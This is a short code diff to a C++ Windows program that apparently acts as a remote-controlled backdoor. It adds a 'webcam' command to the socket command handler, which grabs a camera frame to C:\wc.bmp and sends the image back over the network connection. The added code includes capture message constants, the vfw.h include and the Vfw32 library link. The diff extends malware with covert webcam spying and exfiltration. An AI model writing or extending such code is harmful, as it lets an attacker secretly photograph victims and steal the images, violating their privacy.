@@ -1,5 +1,17 @@
 #define _WINSOCKAPI_
 
+// WEBCAM
+#define WM_CAP_START  0x0400
+#define WM_CAP_DRIVER_CONNECT  (WM_CAP_START + 10)
+#define WM_CAP_DRIVER_DISCONNECT  (WM_CAP_START + 11)
+#define WM_CAP_EDIT_COPY (WM_CAP_START + 30)
+#define WM_CAP_GRAB_FRAME (WM_CAP_START + 60)
+#define WM_CAP_SET_SCALE (WM_CAP_START + 53)
+#define WM_CAP_SET_PREVIEWRATE (WM_CAP_START + 52)
+#define WM_CAP_SET_PREVIEW (WM_CAP_START + 50)
+#define WM_CAP_DLG_VIDEOSOURCE  (WM_CAP_START + 42)
+#define WM_CAP_STOP (WM_CAP_START+ 68)
+
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
@@ -12,6 +24,7 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
+#include <vfw.h>
 #include <tchar.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -24,6 +37,7 @@
 #pragma comment (lib, "AdvApi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "Gdi32.lib")
+#pragma comment(lib, "Vfw32.lib")
 
 unsigned int G_UID;
 TCHAR ID[64];
@@ -89,6 +103,9 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
 
   } else if (cmd == "shutdown") {
     utils::shutdown();
+  } else if (cmd == "webcam") {
+    utils::captureWebcam((char*)"C:\\wc.bmp");
+    net::sendFile(&sock, (char*)"C:\\wc.bmp");
   }
 }
 
